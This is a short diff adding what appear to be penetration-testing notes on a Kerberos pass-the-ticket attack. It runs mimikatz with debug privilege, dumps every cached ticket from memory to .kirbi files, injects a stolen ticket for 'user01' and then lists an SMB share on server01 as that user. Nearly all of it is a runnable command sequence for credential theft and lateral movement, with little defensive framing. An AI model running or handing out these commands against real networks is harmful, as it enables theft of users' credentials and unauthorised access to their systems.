@@ -1,0 +1,16 @@
+.\mimikatz.exe
+privilege::debug
+
+# Now we can export all available tickets on kirbi mimikatz format:
+sekurlsa::tickets /export
+
+# dir *.kirbi will show the options
+
+# On mimi again:
+kerberos::ptt [0;12bd0]-0-0-40810000-user01@cifs-server01.kirbi
+
+# Again on powershell:
+klist
+
+# With this ticket we can check SMB share on server01 as user01:
+ls \\server01\share
